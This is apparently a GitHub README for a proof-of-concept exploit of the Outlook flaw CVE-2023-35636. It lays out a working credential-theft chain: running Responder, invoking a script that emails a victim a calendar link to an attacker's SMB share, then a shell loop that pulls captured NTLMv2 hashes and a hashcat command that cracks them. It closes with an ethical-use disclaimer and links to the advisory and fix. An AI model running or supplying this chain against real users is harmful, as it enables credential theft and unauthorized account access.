# CVE-2023-35636
Microsoft Outlook Information Disclosure Vulnerability (leak password hash) - Expect Script POC

CVE-2023-35636 an exploit of the calendar sharing function in Microsoft Outlook, whereby adding two headers to an email directs Outlook to share content and contact a designated machine creating an opportunity to intercept an NTLM v2 hash.

- Run a responder with SMB server on

![image](https://github.com/duy-31/CVE-2023-35636/assets/20819326/0b7d59ba-2535-4288-a51b-70479d6d0a4b)


- Send an email & wait (the email recipient firewall have to let SMB (445) trafic pass)

usage: ./cve-2023-35636.sh mx.fqdn port email_sender email_recipient smb_share

./cve-2023-35636.sh mail.mydomain.com 25 duy-31@domain.com pwned@otherdomain.com \\\\\\\x.x.x.x\\\mycalendar.ics (dont forget all the \\)

![image](https://github.com/duy-31/CVE-2023-35636/assets/20819326/8e7379d5-8b42-443e-ae9c-620bf2e5dbbf)


notes: chmod +x cve-2023-35636.sh

require app expect

require legitimate ip sender and email sender (to pass SPF, DKIM, DMARC)

- If the recipient user click on the little calendar icon .. BOOM the ip/user (clear text) and password hash (NTLM-v2-SSP) are send to your responder IP

![image](https://github.com/duy-31/CVE-2023-35636/assets/20819326/884b1de2-89c2-47cc-af99-4e8f1dccb517)


![image](https://github.com/duy-31/CVE-2023-35636/assets/20819326/1ee7f21a-713d-4319-b89a-b1c9b87c7306)


- You can then try to crack the password with hashcat/john the ripper

for user in `strings Responder-Session.log | grep "NTLMv2-SSP Hash" | cut -d ":" -f 4-6 | sort -u -f | awk '{$1=$1};1'`

do

echo "[*] search for: $user";

strings Responder-Session.log | grep "NTLMv2-SSP Hash" | grep -i $user | cut -d ":" -f 4-10 | head -n 1 | awk '{$1=$1};1' >> ntlm-hashes.txt

done

hashcat -a 0 -m 5600 ntlm-hashes.txt rockyou.txt -o cracked.txt -O

--------------------------

Kudos: https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes

Workaround/Fix: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-35636

--------------------------

more about me ;) https://www.linkedin.com/in/duy-huan-bui/

⚠️ Disclaimer: IMPORTANT: This script is provided for educational, ethical testing, and lawful use ONLY. Do not use it on any system or network without explicit permission. Unauthorized access to computer systems and networks is illegal, and users caught performing unauthorized activities are subject to legal actions. The author is NOT responsible for any damage caused by the misuse of this script.
